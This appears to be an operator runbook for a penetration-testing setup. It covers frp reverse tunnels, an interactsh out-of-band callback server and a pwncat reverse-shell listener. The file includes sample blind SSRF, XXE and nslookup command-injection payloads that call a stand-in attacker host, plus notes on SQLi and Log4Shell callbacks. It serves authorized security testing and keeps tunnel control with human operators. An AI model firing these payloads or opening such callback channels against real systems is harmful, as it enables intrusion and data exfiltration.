# FRP Tunneling & OOB Callbacks

## Overview

frp (fast reverse proxy) exposes local services to remote targets. All tunnels use the `frpc`
binary with a single TOML config file — one command starts all tunnels.

Tunnels, listeners, and OOB callback servers are **OPERATOR-CONTROLLED shared infrastructure**.
Agents must never start them.

**Agent responsibility:** provide exact commands in `# MANUAL:` playbook steps and reference this file.
**Operator responsibility:** execute the commands, record addresses in `$DIR/.listener_url` and/or
`$DIR/.oob_url`, then signal the agent to continue.

---

## How It Works

```
Internet → Caddy (TLS on :443) → frps vhostHTTPPort (:8080) → frpc → Kali container → local service
                                                                  ↑
Internet → researcher.example:<port> (TCP/UDP) → frps → frpc ───┘
```

**HTTP mode tunnels** go through Caddy, which terminates TLS and proxies to frps by Host header.
For frp subdomain tunnels the URL is `https://<name>.researcher.example`.
For OOB callbacks the URL is `https://<id>.researcher.example`.

**TCP/UDP tunnels** bypass Caddy entirely. frps opens the port directly on the server.
The public endpoint is `researcher.example:<port>`.

---

## Prerequisites (one-time setup)

### DNS record for OOB callbacks

One NS record is required in your DNS provider for `researcher.example`:

| Type | Name | Value | Purpose |
|------|------|-------|---------|
| **NS** | `oob` | `researcher.example` | Delegates `*.researcher.example` to your frp server so DNS and HTTP callbacks reach interactsh via the tunnels |

The wildcard A record on `*.researcher.example` already routes HTTP traffic to the frp server
through Caddy. The NS delegation routes DNS queries to interactsh's DNS listener (UDP 53 tunnel).
interactsh-server handles A-record responses for its own domain via the `-ip` flag (set to the
frp server's public IP) — see the startup command below.

**Do NOT add an A record at `researcher.example`.** Route53 treats the NS record as a
delegation zone cut — an A record at the same name is shadowed and never returned to resolvers.

### AWS Security Group

The `cal-example-sg` security group must allow:

| Port | Protocol | Purpose |
|------|----------|---------|
| 7000 | TCP | frpc → frps bind port |
| 53 | **UDP** | OOB DNS callbacks (interactsh) |
| 8443 | TCP | Reverse shell listener |
| 80 | TCP | Caddy HTTP / ACME |
| 443 | TCP | Caddy HTTPS (HTTP mode tunnels) |

To add a new port:
```bash
aws ec2 authorize-security-group-ingress --profile vigiloss --region us-east-2 \
  --group-id sg-07c68edc29176ff97 \
  --protocol <tcp|udp> --port <PORT> --cidr 0.0.0.0/0
```

---

## frpc Config

A single config file defines all tunnels. Write it to `/data/frpc.toml` inside the Kali runtime
(persists across restarts via the volume mount).

interactsh binds to the container's bridge IP, not loopback. The config must use that IP
for `localIP` so frpc can reach the interactsh listeners. The snippet below auto-detects it.

**Proxy names must be globally unique** across all frpc clients connecting to the same frps.
The config auto-prefixes names with the container hostname (first 8 chars) to avoid collisions
when multiple machines share the frp server. `heartbeatTimeout = 30` on frps ensures stale
clients release their names within 30 seconds.

```bash
docker exec security-research bash -c '
CONTAINER_IP=$(hostname -i | awk "{print \$1}")
CLIENT_PREFIX=$(hostname -s | tr "[:upper:]" "[:lower:]" | cut -c1-8)
cat > /data/frpc.toml << FRPEOF
serverAddr = "researcher.example"
serverPort = 7000
auth.token = "REPLACE_WITH_YOUR_OWN_TOKEN"

# Auto-reconnect when frps restarts or IP changes (connects by hostname)
loginFailExit = false

# OOB DNS — primary callback mechanism (UDP, port 53)
# Requires NS record: oob NS researcher.example
[[proxies]]
name = "${CLIENT_PREFIX}-oob-dns"
type = "udp"
localIP = "${CONTAINER_IP}"
localPort = 53
remotePort = 53

# OOB HTTP — interactsh client polling + callback subdomains via Caddy
[[proxies]]
name = "${CLIENT_PREFIX}-oob"
type = "http"
localIP = "${CONTAINER_IP}"
localPort = 80
customDomains = ["researcher.example", "*.researcher.example"]

# Reverse shell listener (TCP, port 4444)
[[proxies]]
name = "${CLIENT_PREFIX}-oob-rev"
type = "tcp"
localIP = "${CONTAINER_IP}"
localPort = 4444
remotePort = 8443
FRPEOF
echo "[frpc] localIP=${CONTAINER_IP} prefix=${CLIENT_PREFIX}"
'
```

Add more proxies as needed (use `${CONTAINER_IP}` for services inside the container,
`127.0.0.1` only for services bound to loopback):
```toml
# Additional TCP tunnel (example: SOCKS relay on 1080)
[[proxies]]
name = "socks"
type = "tcp"
localIP = "127.0.0.1"
localPort = 1080
remotePort = 1080

# Additional HTTP tunnel (example: web app on 3000)
[[proxies]]
name = "myapp"
type = "http"
localIP = "127.0.0.1"
localPort = 3000
subdomain = "myapp"
# Result: https://researcher.example → localhost:3000
```

---

## Starting All Tunnels

One command starts everything:

```bash
docker exec -it security-research tmux new-session -d -s frpc \
  'frpc -c /data/frpc.toml 2>&1 | tee /data/frpc.log'
```

Verify:
```bash
docker exec security-research tmux capture-pane -t frpc -p | grep -E 'success|error'
```

All proxies should show `start proxy success`. If a proxy shows `port unavailable`, the remote
port is occupied on the frp server.

Record addresses after tunnels are up:
```bash
echo "researcher.example:8443" > "$DIR/.listener_url"
echo "researcher.example" > "$DIR/.oob_url"
```

---

## Standard Tunnels

| Tunnel | Type | Local port | Public endpoint | Purpose |
|--------|------|-----------|-----------------|---------|
| `oob-dns` | UDP | 53 | `researcher.example:53` | **Primary OOB** — DNS callbacks (interactsh) |
| `oob` | HTTP | 80 | `https://researcher.example` + `https://*.researcher.example` | interactsh client polling + HTTP callbacks |
| `oob-rev` | TCP | 4444 | `researcher.example:8443` | Reverse shell listener (pwncat) |

### Why DNS is the primary OOB mechanism

Nearly every blind vulnerability triggers a DNS lookup — even blind SSRF does DNS before
attempting HTTP. If HTTP egress is blocked, the DNS lookup still fires and confirms the vuln.

| Vuln class | Primary callback | Secondary |
|------------|-----------------|-----------|
| Blind SSRF | DNS (always fires first) | HTTP (if egress open) |
| Blind command injection | DNS (`nslookup`/`ping`) | HTTP (if `curl`/`wget`) |
| Blind XXE | DNS | HTTP (entity fetch) |
| Log4Shell | DNS | LDAP (port 389) |
| Blind SQLi | DNS (`xp_dirtree`, `LOAD_FILE`) | Varies |

---

## interactsh Setup

interactsh detects blind vulnerabilities by running DNS and HTTP listeners that record
out-of-band callbacks from the target.

**NEVER use the public `oast.fun` / `oast.pro` server.** OOB callbacks can carry internal IPs,
cloud metadata tokens, and credentials — sending those to third-party infrastructure is a data leak.

### Starting interactsh-server

Flags:
- `-skip-acme` — Caddy handles TLS. interactsh does not need its own certs.
- `-v -debug` — without these, interactions are stored internally but never written to stdout/log.
- `-listen-ip 0.0.0.0` — binds all interfaces so frpc can reach it on the container bridge IP.
- `-ip <SERVER_IP>` — the public IP interactsh returns in DNS A responses. Must be the frp server's
  IP, not the local machine's IP (interactsh auto-detection gets this wrong in Docker/tunnel setups).

The frp server (`researcher.example`) restarts nightly and gets a new public IP each time.
interactsh-server bakes the IP into DNS responses at startup, so it must be restarted when the
IP changes. The wrapper script below handles this automatically — it checks every 60 seconds
and restarts interactsh when the IP rotates.

Write the wrapper once (persists via volume mount):
```bash
docker exec security-research bash -c 'cat > /data/start-oob.sh << "OOBEOF"
#!/usr/bin/env bash
# interactsh-server wrapper — auto-restarts when frp server IP changes
DOMAIN="researcher.example"
FRP_HOST="researcher.example"
CHECK_INTERVAL=60
CURRENT_IP=""

while true; do
  NEW_IP=$(dig +short "$FRP_HOST" A | head -1)

  if [ -z "$NEW_IP" ]; then
    echo "[oob-watch] DNS lookup failed for $FRP_HOST, retrying in ${CHECK_INTERVAL}s..."
    sleep "$CHECK_INTERVAL"
    continue
  fi

  if [ "$NEW_IP" != "$CURRENT_IP" ]; then
    if [ -n "$CURRENT_IP" ]; then
      echo "[oob-watch] IP changed: $CURRENT_IP → $NEW_IP — restarting interactsh-server"
    else
      echo "[oob-watch] Starting interactsh-server with IP $NEW_IP"
    fi

    pkill -f "interactsh-server" 2>/dev/null
    sleep 1

    CURRENT_IP="$NEW_IP"
    interactsh-server -d "$DOMAIN" -listen-ip 0.0.0.0 -ip "$CURRENT_IP" \
      -skip-acme -v -debug >> /data/oob-server.log 2>&1 &

    echo "[oob-watch] interactsh-server started (PID $!, IP $CURRENT_IP)"
  fi

  sleep "$CHECK_INTERVAL"
done
OOBEOF
chmod +x /data/start-oob.sh'
```

interactsh-server listens on DNS (UDP 53) and HTTP (TCP 80). The frpc tunnels expose both.

### Full startup sequence

```bash
# 1. Start interactsh-server (auto-restarts on IP change)
docker exec -it security-research tmux new-session -d -s oob-server \
  'bash /data/start-oob.sh 2>&1 | tee -a /data/oob-watch.log'

# 2. Wait for server to initialize
sleep 5

# 3. Start frpc (auto-reconnects on server restart via loginFailExit = false)
docker exec -it security-research tmux new-session -d -s frpc \
  'frpc -c /data/frpc.toml 2>&1 | tee /data/frpc.log'

# 4. Record OOB URL for agents
echo "researcher.example" > "$DIR/.oob_url"
```

Both services are now resilient to the nightly server restart:
- **frpc** reconnects automatically (`loginFailExit = false`, connects by hostname)
- **interactsh-server** detects the IP change within 60 seconds and restarts with the new IP

### Verifying OOB works

```bash
# DNS callback (from any machine):
dig researcher.example @8.8.8.8

# HTTP callback (from target or any machine):
curl http://researcher.example/ssrf-test-$(date +%s)

# DNS-only callback (subdomain-based, for blind SSRF/XXE/SQLi):
curl http://ssrf-test-$(date +%s).researcher.example

# Check if interactsh recorded it:
docker exec security-research tail -20 /data/oob-server.log
# Should show lines like: "[INF] Received DNS interaction (A) from ..."
```

### Viewing callback hits

**interactsh-client (preferred)** — shows only hits matching your payload's correlation ID.
Filters out AWS health check noise and other non-engagement DNS traffic automatically.

```bash
# Interactive — run in a terminal, shows correlated hits as they arrive
docker exec -it security-research interactsh-client -server researcher.example

# Background — log to file, agents can tail it via Kali MCP
docker exec -it security-research tmux new-session -d -s oob-client \
  'interactsh-client -server researcher.example -v -poll-interval 5 2>&1 | tee /data/oob-client.log'
```

The client prints a unique callback URL on startup (e.g., `researcher.example`).
Use that URL in blind payloads. Only callbacks containing that correlation ID appear in the output.

**Raw server log (noisy)** — shows ALL interactions including AWS resolver health checks.
Use only for debugging, not for confirming OOB hits during an engagement.

```bash
docker exec security-research tail -50 /data/oob-server.log
```

### Using OOB callbacks in exploit payloads

When exploit-developer or vulnerability-analyst needs OOB detection for blind vulnerabilities:

1. **Check if OOB is available:** read `$DIR/.oob_url`. If the file exists, OOB is provisioned.

2. **Get a per-session callback URL** from interactsh-client:
   ```bash
   # Read the correlation URL from the client log (first URL printed at startup)
   grep -oE '[a-z0-9]+\.oob\.example\.com' /data/oob-client.log | head -1
   ```
   This URL is unique per interactsh-client session. All callbacks containing its correlation
   prefix are automatically filtered and shown in `/data/oob-client.log`.

3. **Embed the callback URL in payloads** — use the full correlation URL, not the base domain:
   ```
   # Blind SSRF
   http://<correlation-id>.researcher.example/ssrf-endpoint-name

   # Blind command injection (DNS)
   nslookup <correlation-id>.researcher.example

   # Blind XXE
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://<correlation-id>.researcher.example/xxe">]>
   ```

   **Tip:** Append the endpoint name or test label as a URL path suffix so you can identify
   which payload triggered the callback:
   ```
   http://<correlation-id>.researcher.example/webhook-ssrf-test
   http://<correlation-id>.researcher.example/xxe-users-endpoint
   ```

4. **Check for hits** via Kali MCP after sending payloads:
   ```bash
   tail -50 /data/oob-client.log    # Correlated hits only (preferred)
   tail -50 /data/oob-server.log    # Raw log (noisy, for debugging)
   ```

5. **If OOB is not available:** fall back to time-based detection (sleep payloads) and note
   in output that OOB was unavailable. If time-based also fails and OOB would have been
   decisive, stop and ask the operator to provision interactsh + frp tunnels per this file.

---

## tmux Session Management

### Naming convention

| Session | Purpose |
|---------|---------|
| `frpc` | All frp tunnels (single session) |
| `oob-server` | interactsh-server |
| `shell-<port>` | pwncat shell sessions (see `shell-handling.md`) |

### Common commands

```bash
# List all active sessions
docker exec security-research tmux list-sessions

# Attach to frpc (interactive — operator use only)
docker exec -it security-research tmux attach -t frpc

# Kill frpc tunnels
docker exec security-research tmux kill-session -t frpc

# Kill everything
docker exec security-research tmux kill-server
```

---

## Logging & Log Locations

All processes log to `/data/` inside the container via `tee`. `/data/` is a volume mount that
persists across restarts.

| Log file | Source | What it contains |
|----------|--------|-----------------|
| `/data/frpc.log` | frpc (all tunnels) | Tunnel registration, connection status, reconnection events |
| `/data/oob-server.log` | interactsh-server | **Raw callback hits** (includes AWS noise) |
| `/data/oob-client.log` | interactsh-client | **Correlated callback hits** (preferred, no noise) |
| `/data/oob-watch.log` | start-oob.sh wrapper | IP change detection, interactsh restart events |
| `/data/shell-*.log` | pwncat shell sessions | Shell I/O (see `shell-handling.md`) |

---

## Notes

- **DNS uses UDP.** The `oob-dns` proxy must be `type = "udp"`, not `type = "tcp"`.
- **HTTP tunnels go through Caddy** (TLS termination) → frps vhostHTTPPort → frpc.
- **TCP/UDP tunnels bypass Caddy** — frps opens the port directly.
- Each proxy `name` must be unique across all active frpc connections.
- Ports 80/443 are Caddy — do not create TCP tunnels on these ports. Use HTTP type with `subdomain` instead.
- frps vhostHTTPPort (8080) is reserved — do not create TCP tunnels on 8080.
- `/data/frpc.toml` persists across container restarts (volume mount). Edit it to add/remove tunnels.
